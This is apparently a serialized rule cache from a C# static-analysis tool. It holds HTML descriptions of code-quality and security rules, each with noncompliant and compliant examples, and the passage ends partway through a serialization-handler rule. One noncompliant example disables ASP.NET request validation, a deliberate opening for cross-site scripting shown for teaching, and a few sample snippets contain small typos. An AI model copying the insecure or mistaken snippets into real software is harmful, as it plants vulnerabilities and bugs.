csharpsquidS2327P"try" statements with identical "catch" and/or "finally" blocks should be merged"MAJOR*cs:Œ<p>When multiple, adjacent <code>try</code> statements have duplicate <code>catch</code> and/or <code>finally</code> blocks, they should be merged to
consolidate the <code>catch/finally</code> logic for cleaner, more readable code. Note that this applies even when there is intervening code outside
any <code>try</code> block.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try
{
  DoTheFirstThing(a, b);
}
catch (InvalidOperationException ex)
{
  HandleException(ex);
}

DoSomeOtherStuff();

try  // Noncompliant; catch is identical to previous
{
  DoTheSecondThing();
}
catch (InvalidOperationException ex)
{
  HandleException(ex);
}

try  // Compliant; catch handles exception differently
{
  DoTheThirdThing(a);
}
catch (InvalidOperationException ex)
{
  LogAndDie(ex);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try
{
  DoTheFirstThing(a, b);
  DoSomeOtherStuff();
  DoTheSecondThing();
}
catch (InvalidOperationException ex)
{
  HandleException(ex);
}

try  // Compliant; catch handles exception differently
{
  DoTheThirdThing(a);
}
catch (InvalidOperationException ex)
{
  LogAndDie(ex);
}
</pre>Z
CODE_SMELL
Â

csharpsquid:S1121œ

csharpsquidS1121:Assignments should not be made from within sub-expressions"MAJOR*cs:Â	<p>Assignments within sub-expressions are hard to spot and therefore make the code less readable. Ideally, sub-expressions should not have
side-effects.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (string.IsNullOrEmpty(result = str.Substring(index, length))) // Noncompliant
{
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
var result = str.Substring(index, length);
if (string.IsNullOrEmpty(result))
{
  //...
}
</pre>
<h2>Exceptions</h2>
<p>Assignments inside lambda and delegate expressions are allowed. </p>
<p>Furthermore, the following patterns are also accepted:</p>
<pre>
var a = b = c = 10;
</pre>
<pre>
while ((val = GetNewValue()) &gt; 0)
{
...
}
</pre>
<pre>
private MyClass instance;
public MyClass Instance
{
  get
  {
    return instance ?? (instance = new MyClass());
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/481.html">MITRE, CWE-481</a> - Assigning instead of Comparing </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/nYFtAg">CERT, EXP45-C.</a> - Do not perform assignments in selection statements </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/1gCTAw">CERT, EXP51-J.</a> - Do not perform assignments in conditional expressions
  </li>
</ul>Z
CODE_SMELL
˘
csharpsquid:S1123„
csharpsquidS11231"Obsolete" attributes should include explanations"MAJOR*cs:Ç<p>The <code>Obsolete</code> attribute can be applied with or without arguments, but marking something <code>Obsolete</code> without including advice
as to why it's obsolete or on what to use instead will lead maintainers to waste time trying to figure those things out - every single time the
warning is encountered.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Car
{

  [Obsolete]  // Noncompliant
  public void CrankEngine(int turnsOfCrank)
  { ... }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Car
{

  [Obsolete("Replaced by the automatic starter")]
  public void CrankEngine(int turnsOfCrank)
  { ... }
}
</pre>Z
CODE_SMELL
Ç
csharpsquid:S1244Ï

csharpsquidS12448Floating point numbers should not be tested for equality"MAJOR*cs:ã
<p>Floating point math is imprecise because of the challenges of storing such values in a binary representation. Even worse, floating point math is
not associative; push a <code>float</code> or a <code>double</code> through a series of simple mathematical operations and the answer will be
different based on the order of those operation because of the rounding that takes place at each step.</p>
<p>Even simple floating point assignments are not simple:</p>
<pre>
float f = 0.100000001f; // 0.1
double d = 0.10000000000000001; // 0.1
</pre>
<p>(Results will vary based on compiler and compiler settings)</p>
<p>Therefore, the use of the equality (<code>==</code>) and inequality (<code>!=</code>) operators on <code>float</code> or <code>double</code> values
is almost always an error.</p>
<p>This rule checks for the use of direct and indirect equality/inequality tests on floats and doubles.</p>
<h2>Noncompliant Code Example</h2>
<pre>
float myNumber = 3.146f;
if ( myNumber == 3.146f ) //Noncompliant. Because of floating point imprecision, this will be false
{
  // ...
}

if (myNumber &lt;= 3.146f &amp;&amp; mNumber &gt;= 3.146f) // Noncompliant indirect equality test
{
  // ...
}

if (myNumber &lt; 4 || myNumber &gt; 4) // Noncompliant indirect inequality test
{
  // ...
}
</pre>ZBUG
û	
csharpsquid:S4070à	
csharpsquidS4070:Non-flags enums should not be marked with "FlagsAttribute""MAJOR*cs:û<p>This rule raises an issue when an externally visible enumeration is marked with <code>FlagsAttribute</code> and one, or more, of its values is not
a power of 2 or a combination of the other defined values.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;

namespace MyLibrary
{
    [FlagsAttribute]
    public enum Color // Noncompliant, Orange is neither a power of two, nor a combination of any of the defined values
    {
        None    = 0,
        Red     = 1,
        Orange  = 3,
        Yellow  = 4
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;

namespace MyLibrary
{
    public enum Color // Compliant - no FlagsAttribute attribute
    {
        None = 0,
        Red = 1,
        Orange = 3,
        Yellow = 4
    }

    [FlagsAttribute]
    public enum Days
    {
        None = 0,
        Monday = 1,
        Tuesday = 2,
        Wednesday = 4,
        Thursday = 8,
        Friday = 16,
        All = Monday| Tuesday | Wednesday | Thursday | Friday    // Compliant - combination of other values
    }
}
</pre>Z
CODE_SMELL
ñ
csharpsquid:S3358Ä
csharpsquidS3358&Ternary operators should not be nested"MAJOR*cs:™<p>Just because you <em>can</em> do something, doesn't mean you should, and that's the case with nested ternary operations. Nesting ternary operators
results in the kind of code that may seem clear as day when you write it, but six months later will leave maintainers (or worse - future you)
scratching their heads and cursing.</p>
<p>Instead, err on the side of clarity, and use another line to express the nested operation as a separate statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public string GetTitle(Person p)
{
  return p.Gender == Gender.MALE ? "Mr. " : p.IsMarried ? "Mrs. " : "Miss ";  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public string GetTitle(Person p)
{
  if (p.Gender == Gender.MALE)
  {
    return "Mr. ";
  }
  return p.IsMarried ? "Mrs. " : "Miss ";
}
</pre>Z
CODE_SMELL
ª
csharpsquid:S3598•
csharpsquidS3598BOne-way "OperationContract" methods should have "void" return type"MAJOR*cs:∫<p>When declaring a Windows Communication Foundation (WCF) <code>OperationContract</code> method one-way, that service method won't return any result,
not even an underlying empty confirmation message. These are fire-and-forget methods that are useful in event-like communication. Specifying a return
type therefore does not make sense.</p>
<h2>Noncompliant Code Example</h2>
<pre>
[ServiceContract]
interface IMyService
{
  [OperationContract(IsOneWay = true)]
  int SomethingHappened(int parameter); // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
[ServiceContract]
interface IMyService
{
  [OperationContract(IsOneWay = true)]
  void SomethingHappened(int parameter);
}
</pre>
<h2>Exceptions</h2>
<p>The rule doesn't report if <code>OperationContractAttribute.AsyncPattern</code> is set to <code>true</code>.</p>ZBUG
”
csharpsquid:S4200Ω
csharpsquidS4200 Native methods should be wrapped"MAJOR*cs:Ì
<p>Native methods are functions that reside in libraries outside the virtual machine. Being able to call them is useful for interoperability with
applications and libraries written in other programming languages, in particular when performing platform-specific operations. However doing so comes
with extra risks since it means stepping out of the security model of the virtual machine. It is therefore highly recommended to take extra steps,
like input validation, when invoking native methods. This is best done by making the native method <code>private</code> and by providing a wrapper
that performs these extra steps and verifications.</p>
<p>This rule raises an issue when a native method is declared <code>public</code> or its wrapper is too trivial.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;
using System.Runtime.InteropServices;

namespace MyLibrary
{
  class Foo
  {
    [DllImport("mynativelib")]
    extern public static void Bar(string s, int x); // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;
using System.Runtime.InteropServices;

namespace MyLibrary
{
  class Foo
  {
    [DllImport("mynativelib")]
    extern private static void Bar(string s, int x);

    public void BarWrapper(string s, int x)
    {
      if (s != null &amp;&amp; x &gt;= 0  &amp;&amp; x &lt; s.Length)
      {
        bar(s, x);
      }
    }
  }
}
</pre>Z
CODE_SMELL
≠	
csharpsquid:S3597ó	
csharpsquidS3597L"ServiceContract" and "OperationContract" attributes should be used together"MAJOR*cs:õ<p>The <code>ServiceContract</code> attribute specifies that a class or interface defines the communication contract of a Windows Communication
Foundation (WCF) service. The service operations of this class or interface are defined by <code>OperationContract</code> attributes added to methods.
It doesn't make sense to define a contract without any service operations; thus, in a <code>ServiceContract</code> class or interface at least one
method should be annotated with <code>OperationContract</code>. Similarly, WCF only serves <code>OperationContract</code> methods that are defined
inside <code>ServiceContract</code> classes or interfaces; thus, this rule also checks that <code>ServiceContract</code> is added to the containing
type of <code>OperationContract</code> methods.</p>
<h2>Noncompliant Code Example</h2>
<pre>
[ServiceContract]
interface IMyService // Noncompliant
{
  int MyServiceMethod();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
[ServiceContract]
interface IMyService
{
  [OperationContract]
  int MyServiceMethod();
}
</pre>Z
CODE_SMELL
ı
csharpsquid:S4564ﬂ
csharpsquidS4564>ASP.NET HTTP request validation feature should not be disabled"MAJOR*cs:Ó<p>ASP.Net has a feature to validate HTTP requests to prevent potentially dangerous content to perform a cross-site scripting (XSS) attack. There is
no reason to disable this mechanism even if other checks to prevent XXS attacks are in place.</p>
<p>This rule raises an issue if a method with parameters is marked with <code>System.Web.Mvc.HttpPostAttribute</code> and not
<code>System.Web.Mvc.ValidateInputAttribute(true)</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class FooBarController : Controller
{
    [HttpPost] // Noncompliant
    [ValidateInput(false)]
    public ActionResult Purchase(string input)
    {
        return Foo(input);
    }

    [HttpPost] // Noncompliant
    public ActionResult PurchaseSomethingElse(string input)
    {
        return Foo(input);
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class FooBarController : Controller
{
    [HttpPost]
    [ValidateInput(true)] // Compliant
    public ActionResult Purchase(string input)
    {
        return Foo(input);
    }
}
</pre>
<h2>Exceptions</h2>
<p>Parameterless methods marked with <code>System.Web.Mvc.HttpPostAttribute</code> will not trigger this issue.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)">OWASP Top 10 2017 Category A7</a> - Cross-Site Scripting
  (XSS) </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/79">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation ('Cross-site
  Scripting') </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat1">SANS Top 25</a> - Insecure Interaction Between Components </li>
  <li> <a href="https://www.owasp.org/index.php/ASP.NET_Request_Validation">OWASP ASP.NET Request Validation</a> </li>
</ul>ZVULNERABILITY
°
csharpsquid:S1854ã
csharpsquidS1854$Unused assignments should be removed"MAJOR*cs:∑<p>A dead store happens when a local variable is assigned a value that is not read by any subsequent instruction. Calculating or retrieving a value
only to then overwrite it or throw it away, could indicate a serious error in the code. Even if it's not an error, it is at best a waste of resources.
Therefore all calculated values should be used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
i = a + b; // Noncompliant; calculation result not used before value is overwritten
i = compute();
</pre>
<h2>Compliant Solution</h2>
<pre>
i = a + b;
i += compute();
</pre>
<h2>Exceptions</h2>
<p>No issue is reported when </p>
<ul>
  <li> the analyzed method body contains <code>try</code> blocks, </li>
  <li> a lambda expression captures the local variables, or </li>
  <li> the variable is unused (case covered by Rule S1481) </li>
  <li> initializations to <code>-1</code>, <code>0</code>, <code>1</code>, <code>null</code>, <code>true</code>, <code>false</code>, <code>""</code>
  and <code>string.Empty</code>. </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/563.html">MITRE, CWE-563</a> - Assignment to Variable without Use ('Unused Variable') </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/QYA5">CERT, MSC13-C.</a> - Detect and remove unused values </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/uQCSBg">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>
</ul>Z
CODE_SMELL
å
csharpsquid:S3909ˆ
csharpsquidS39092Collections should implement the generic interface"MAJOR*cs:î<p>The NET Framework 2.0 introduced the generic interface <code>System.Collections.Generic.IEnumerable&lt;T&gt;</code> and it should be preferred over
the older, non generic, interfaces.</p>
<p>This rule raises an issue when a public type implements <code>System.Collections.IEnumerable</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;
using System.Collections;

public class MyData
{
  public MyData()
  {
  }
}

public class MyList : CollectionBase // Noncompliant
{
  public void Add(MyData data)
  {
    InnerList.Add(data);
  }

  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;
using System.Collections.ObjectModel;

public class MyData
{
  public MyData()
  {
  }
}

public class MyList : Collection&lt;MyData&gt;
{
  // Implementation...
}
</pre>Z
CODE_SMELL
“

csharpsquid:S1172º

csharpsquidS1172*Unused method parameters should be removed"MAJOR*cs:‚	<p>Unused parameters are misleading. Whatever the values passed to such parameters, the behavior will be the same.</p>
<p>This rule raises an issue when a <code>private</code> method of a class/struct takes a parameter without using it.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private void DoSomething(int a, int b) // "b" is unused
{
    Compute(a);
}

private void DoSomething2(int a) // value of "a" is unused
{
    a = 10;
    Compute(a);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private void DoSomething(int a)
{
    Compute(a);
}

private void DoSomething2()
{
    var a = 10;
    Compute(a);
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't raise any issue in the following contexts:</p>
<ul>
  <li> The <code>this</code> parameter of extension methods. </li>
  <li> Methods decorated with attributes. </li>
  <li> Empty methods. </li>
  <li> Methods which only throw <code>NotImplementedException</code>. </li>
  <li> Main methods. </li>
  <li> <code>virtual</code>, <code>override</code> methods. </li>
  <li> interface implementations. </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>Z
CODE_SMELL
¬
csharpsquid:S3908¨
csharpsquidS3908%Generic event handlers should be used"MAJOR*cs:◊<p>Since .Net Framework version 2.0 it is not necessary to declare a delegate that specifies a class derived from <code>System.EventArgs</code>. The
<code>System.EventHandler&lt;TEventArgs&gt;</code> delegate mechanism should be used instead as it allows any class derived from
<code>EventArgs</code> to be used with that handler.</p>
<p>This rule raises an issue when an old style delegate is used as an event handler.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyEventArgs : EventArgs
{
}

public delegate void MyEventHandler(object sender, MyEventArgs e); // Noncompliant

public class EventProducer
{
  public event MyEventHandler MyEvent;

  protected virtual void OnMyEvent(MyEventArgs e)
  {
    if (MyEvent != null)
    {
      MyEvent(e);
    }
  }
}

public class EventConsumer
{
  public EventConsumer(EventProducer producer)
  {
      producer.MyEvent += HandleEvent;
  }

  private void HandleEvent(object sender, MyEventArgs e)
  {
    // Do something...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyEventArgs : EventArgs
{
}

public class EventProducer
{
  public event EventHandler&lt;MyEventArgs&gt; MyEvent;

  protected virtual void OnMyEvent(MyEventArgs e)
  {
    if (MyEvent != null)
    {
      MyEvent(e);
    }
  }
}

public class EventConsumer
{
  public EventConsumer(EventProducer producer)
  {
      producer.MyEvent += HandleEvent;
  }

  private void HandleEvent(object sender, MyEventArgs e)
  {
    // Do something...
  }
}
</pre>Z
CODE_SMELL
Ω
csharpsquid:S4214ß
csharpsquidS4214("P/Invoke" methods should not be visible"MAJOR*cs:œ<p>Methods marked with the <code>System.Runtime.InteropServices.DllImportAttribute</code> attribute use Platform Invocation Services to access
unmanaged code and should not be exposed. Keeping them private or internal makes sure that their access is controlled and properly managed.</p>
<p>This rule raises an issue when a method declared with <code>DllImport</code> is public or protected.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;
using System.Runtime.InteropServices;

namespace MyLibrary
{
    public class Foo
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        public static extern bool RemoveDirectory(string name);  // Noncompliant
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;
using System.Runtime.InteropServices;

namespace MyLibrary
{
    public class Foo
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        private static extern bool RemoveDirectory(string name);
    }
}
</pre>Z
CODE_SMELL
à
csharpsquid:S4457Ú
csharpsquidS4457AParameter validation in "async"/"await" methods should be wrapped"MAJOR*cs:Å<p>Because of the way <code>async/await</code> methods are rewritten by the compiler, any exceptions thrown during the parameters check will happen
only when the task is observed. That could happen far away from the source of the buggy code or never happen for fire-and-forget tasks.</p>
<p>Therefore it is recommended to split the method into two: an outer method handling the parameter checks (without being <code>async/await</code>)
and an inner method to handle the iterator block with the <code>async/await</code> pattern.</p>
<p>This rule raises an issue when an <code>async</code> method throws any exception derived from <code>ArgumentException</code> and contains
<code>await</code> keyword.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public static async Task SkipLinesAsync(this TextReader reader, int linesToSkip) // Noncompliant
{
    if (reader == null) { throw new ArgumentNullException(nameof(reader)); }
    if (linesToSkip &lt; 0) { throw new ArgumentOutOfRangeException(nameof(linesToSkip)); }

    for (var i = 0; i &lt; linesToSkip; ++i)
    {
        var line = await reader.ReadLineAsync().ConfigureAwait(false);
        if (line == null) { break; }
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public static Task SkipLinesAsync(this TextReader reader, int linesToSkip)
{
    if (reader == null) { throw new ArgumentNullException(nameof(reader)); }
    if (linesToSkip &lt; 0) { throw new ArgumentOutOfRangeException(nameof(linesToSkip)); }

    return reader.SkipLinesInternalAsync(linesToSkip);
}

private static async Task SkipLinesInternalAsync(this TextReader reader, int linesToSkip)
{
    for (var i = 0; i &lt; linesToSkip; ++i)
    {
        var line = await reader.ReadLineAsync().ConfigureAwait(false);
        if (line == null) { break; }
    }
}
</pre>Z
CODE_SMELL
»

csharpsquid:S3249≤

csharpsquidS3249WClasses directly extending "object" should not call "base" in "GetHashCode" or "Equals""MAJOR*cs:≤	<p>Making a <code>base</code> call in an overriding method is generally a good idea, but not in <code>GetHashCode</code> and <code>Equals</code> for
classes that directly extend <code>object</code> because those methods are based on the object reference. Meaning that no two <code>objects</code>
that use those <code>base</code> methods will ever be equal or have the same hash.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Point
{
  private readonly int x;
  public MyClass(int x)
  {
    this.x = x;
  }
  public override int GetHashCode()
  {
    return x.GetHashCode() ^ base.GetHashCode(); //Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Point
{
  private readonly int x;
  public MyClass(int x)
  {
    this.x = x;
  }
  public override int GetHashCode()
  {
    return x.GetHashCode();
  }
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't report on guard conditions checking for reference equality.</p>
<pre>
public class Point
{
  public override bool Equals(object obj)
  {
    if (base.Equals(obj)) // Compliant, although it could be replaced with object.ReferenceEquals(obj, this), which is clearer
    {
      return true;
    }
    ...
  }
}
</pre>ZBUG
é
csharpsquid:S4456¯
csharpsquidS4456:Parameter validation in yielding methods should be wrapped"MAJOR*cs:é<p>Because of the way <code>yield</code> methods are rewritten by the compiler (they become lazily evaluated state machines) any exceptions thrown
during the parameters check will happen only when the collection is iterated over. That could happen far away from the source of the buggy code.</p>
<p>Therefore it is recommended to split the method into two: an outer method handling the validation (no longer lazy) and an inner (lazy) method to
handle the iteration.</p>
<p>This rule raises an issue when a method throws any exception derived from <code>ArgumentException</code> and contains the <code>yield</code>
keyword.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public static IEnumerable&lt;TSource&gt; TakeWhile&lt;TSource&gt;(this IEnumerable&lt;TSource&gt; source, Func&lt;TSource, bool&gt; predicate) // Noncompliant
{
    if (source == null) { throw new ArgumentNullException(nameof(source)); }
    if (predicate == null) { throw new ArgumentNullException(nameof(predicate)); }

    foreach (var element in source)
    {
        if (!predicate(element)) { break; }
        yield return element;
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public static IEnumerable&lt;TSource&gt; TakeWhile&lt;TSource&gt;(this IEnumerable&lt;TSource&gt; source, Func&lt;TSource, bool&gt; predicate)
{
    if (source == null) { throw new ArgumentNullException(nameof(source)); }
    if (predicate == null) { throw new ArgumentNullException(nameof(predicate)); }
    return TakeWhileIterator&lt;TSource&gt;(source, predicate);
}

private static IEnumerable&lt;TSource&gt; TakeWhileIterator&lt;TSource&gt;(IEnumerable&lt;TSource&gt; source, Func&lt;TSource, bool&gt; predicate)
{
    foreach (TSource element in source)
    {
        if (!predicate(element)) break;
        yield return element;
    }
}
</pre>Z
CODE_SMELL
ß	
csharpsquid:S1862ë	
csharpsquidS1862BRelated "if/else if" statements should not have the same condition"MAJOR*cs:¶<p>A chain of <code>if</code>/<code>else if</code> statements is evaluated from top to bottom. At most, only one branch will be executed: the first
one with a condition that evaluates to <code>true</code>. </p>
<p>Therefore, duplicating a condition automatically leads to dead code. Usually, this is due to a copy/paste error. At best, it's simply dead code and
at worst, it's a bug that is likely to induce further bugs as the code is maintained, and obviously it could lead to unexpected behavior. </p>
<h2>Noncompliant Code Example</h2>
<pre>
if (param == 1)
{
  OpenWindow();
}
else if (param == 2)
{
  CloseWindow();
}
else if (param == 1) // Noncompliant
{
  MoveWindowToTheBackground();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (param == 1)
{
  OpenWindow();
}
else if (param == 2)
{
  CloseWindow();
}
else if (param == 3)
{
  MoveWindowToTheBackground();
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>ZBUG
∂
csharpsquid:S3246†
csharpsquidS3246@Generic type parameters should be co/contravariant when possible"MAJOR*cs:∞<p>In the interests of making code as usable as possible, interfaces and delegates with generic parameters should use the <code>out</code> and
<code>in</code> modifiers when possible to make the interfaces and delegates covariant and contravariant, respectively.</p>
<p>The <code>out</code> keyword can be used when the type parameter is used only as a return type in the interface or delegate. Doing so makes the
parameter covariant, and allows interface and delegate instances created with a sub-type to be used as instances created with a base type. The most
notable example of this is <code>IEnumerable&lt;out T&gt;</code>, which allows the assignment of an <code>IEnumerable&lt;string&gt;</code> instance to
an <code>IEnumerable&lt;object&gt;</code> variable, for instance.</p>
<p>The <code>in</code> keyword can be used when the type parameter is used only as a method parameter in the interface or a parameter in the delegate.
Doing so makes the parameter contravariant, and allows interface and delegate instances created with a base type to be used as instances created with
a sub-type. I.e. this is the inversion of covariance. The most notable example of this is the <code>Action&lt;in T&gt;</code> delegate, which allows
the assignment of an <code>Action&lt;object&gt;</code> instance to a <code>Action&lt;string&gt;</code> variable, for instance.</p>
<h2>Noncompliant Code Example</h2>
<pre>
interface IConsumer&lt;T&gt;  // Noncompliant
{
    bool Eat(T fruit);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
interface IConsumer&lt;in T&gt;
{
    bool Eat(T fruit);
}
</pre>Z
CODE_SMELL
Œ
csharpsquid:S3005∏
csharpsquidS30056"ThreadStatic" should not be used on non-static fields"MAJOR*cs:Ÿ<p>When a non-<code>static</code> class field is annotated with <code>ThreadStatic</code>, the code seems to show that the field can have different
values for different calling threads, but that's not the case, since the <code>ThreadStatic</code> attribute is simply ignored on
non-<code>static</code> fields. </p>
<p>So <code>ThreadStatic</code> should either be removed or replaced with a use of the <code>ThreadLocal&lt;T&gt;</code> class, which gives a similar
behavior for non-<code>static</code> fields.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass
{
  [ThreadStatic]  // Noncompliant
  private int count = 0;

  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass
{
  private int count = 0;

  // ...
}
</pre>
<p>or</p>
<pre>
public class MyClass
{
  private readonly ThreadLocal&lt;int&gt; count = new ThreadLocal&lt;int&gt;();
  public int Count
  {
    get { return count.Value; }
    set { count.Value = value; }
  }
  // ...
}
</pre>ZBUG
Ω
csharpsquid:S4211ß
csharpsquidS4211<Members should not have conflicting transparency annotations"MAJOR*cs:∏<p>Transparency attributes, <code>SecurityCriticalAttribute</code> and <code>SecuritySafeCriticalAttribute</code> are used to identify code that
performs security-critical operations. The second one indicates that it is safe to call this code from transparent, while the first one does not.
Since the transparency attributes of code elements with larger scope take precedence over transparency attributes of code elements that are contained
in the first element a class, for instance, with a <code>SecurityCriticalAttribute</code> can not contain a method with a
<code>SecuritySafeCriticalAttribute</code>.</p>
<p>This rule raises an issue when a member is marked with a <code>System.Security</code> security attribute that has a different transparency than the
security attribute of a container of the member.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;
using System.Security;

namespace MyLibrary
{

    [SecurityCritical]
    public class Foo
    {
        [SecuritySafeCritical] // Noncompliant
        public void Bar()
        {
        }
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;
using System.Security;

namespace MyLibrary
{

    [SecurityCritical]
    public class Foo
    {
        public void Bar()
        {
        }
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
</ul>ZVULNERABILITY
»	
csharpsquid:S3244≤	
csharpsquidS3244AAnonymous delegates should not be used to unsubscribe from Events"MAJOR*cs:»<p>It is possible to subscribe to events with anonymous delegates, but having done so, it is impossible to unsubscribe from them. That's because the
process of subscribing adds the delegate to a list. The process of unsubscribing essentially says: remove <em>this item</em> from the subscription
list. But because an anonymous delegate was used in both cases, the unsubscribe attempt tries to remove a different item from the list than was added.
The result: <code>NOOP</code>.</p>
<p>Instead, save the delegate to a variable and use the variable to subscribe and unsubscribe.</p>
<h2>Noncompliant Code Example</h2>
<pre>
listView.PreviewTextInput += (obj,args) =&gt;
        listView_PreviewTextInput(obj,args,listView);

// ...

listView.PreviewTextInput -= (obj, args) =&gt;
        listView_PreviewTextInput(obj, args, listView); // Noncompliant; this delegate was never subscribed
</pre>
<h2>Compliant Solution</h2>
<pre>
EventHandler func = (obj,args) =&gt; listView_PreviewTextInput(obj,args,listView);

listView.PreviewTextInput += func;

// ...

listView.PreviewTextInput -= func;
</pre>ZBUG
Œ
csharpsquid:S3366∏
csharpsquidS3366."this" should not be exposed from constructors"MAJOR*cs:⁄<p>In single-threaded environments, the use of <code>this</code> in constructors is normal, and expected. But in multi-threaded environments, it could
expose partially-constructed objects to other threads, and should be used with caution.</p>
<p>The classic example is a class with a <code>static</code> list of its instances. If the constructor stores <code>this</code> in the list, another
thread could access the object before it's fully-formed. Even when the storage of <code>this</code> is the last instruction in the constructor,
there's still a danger if the class is not <code>final</code>. In that case, the initialization of subclasses won't be complete before
<code>this</code> is exposed.</p>
<p>This rule raises an issue when <code>this</code> is assigned to any globally-visible object in a constructor, and when it is passed to the method
of another object in a constructor</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Monument
{
  public static readonly List&lt;Monument&gt; ALL_MONUMENTS = new List&lt;Monument&gt;();
  // ...

  public Monument(string location, ...)
  {
    ALL_MONUMENTS.Add(this);  // Noncompliant; passed to a method of another object

    this.location = location;
    // ...
  }
}
</pre>
<h2>Exceptions</h2>
<p>This rule ignores instances of assigning <code>this</code> directly to a <code>static</code> field of the same class because that case is covered
by S3010.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/aAD1AQ">CERT, TSM01-J.</a> - Do not let the this reference escape during object
  construction </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/7ABQAg">CERT, TSM03-J.</a> - Do not publish partially initialized objects </li>
</ul>Z
CODE_SMELL
ö
csharpsquid:S1066Ñ
csharpsquidS1066,Collapsible "if" statements should be merged"MAJOR*cs:®<p>Merging collapsible <code>if</code> statements increases the code's readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition1)
{
    if (condition2)
    {
        // ...
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition1 &amp;&amp; condition2)
{
    // ...
}
</pre>Z
CODE_SMELL
“

csharpsquid:S4210º

csharpsquidS4210:Windows Forms entry points should be marked with STAThread"MAJOR*cs:Ÿ	<p>When an assembly uses Windows Forms (classes and interfaces from the <code>System.Windows.Forms</code> namespace) its entry point should be marked
with the <code>STAThreadAttribute</code> to indicate that the threading model should be "Single-Threaded Apartment" (STA) which is the only one
supported by Windows Forms.</p>
<p>This rule raises an issue when the entry point (<code>static void Main</code> method) of an assembly using Windows Forms is not marked as STA.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;
using System.Windows.Forms;

namespace MyLibrary
{
    public class MyForm: Form
    {
        public MyForm()
        {
            this.Text = "Hello World!";
        }

        public static void Main()  // Noncompliant
        {
            var form = new MyForm();
            Application.Run(form);
        }
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;
using System.Windows.Forms;

namespace MyLibrary
{
    public class MyForm: Form
    {
        public MyForm()
        {
            this.Text = "Hello World!";
        }

        [STAThread]
        public static void Main()
        {
            var form = new MyForm();
            Application.Run(form);
        }
    }
}
</pre>ZBUG
Á
csharpsquid:S3927—
csharpsquidS3927<Serialization event handlers should be implemented correctly"MAJOR*cs:Ï<p>Serialization event handlers that don't have the correct signature will simply not be called, thus bypassing any attempts to augment the automated
de/serialization.</p>
<p>This rule raises issue when a method marked with one of the following attributes is not <code>private</code>, does not return <code>void</code>,
has type parameters, or does not have a single parameter of type <code>System.Runtime.Serialization.StreamingContext</code>:</p>
<ul>
  <li> <code>System.Runtime.Serialization.OnSerializingAttribute</code> </li>
  <li> <code>System.Runtime.Serialization.OnSerializedAttribute</code> </li>
  <li> <code>System.Runtime.Serialization.OnDeserializingAttribute</code> </li>
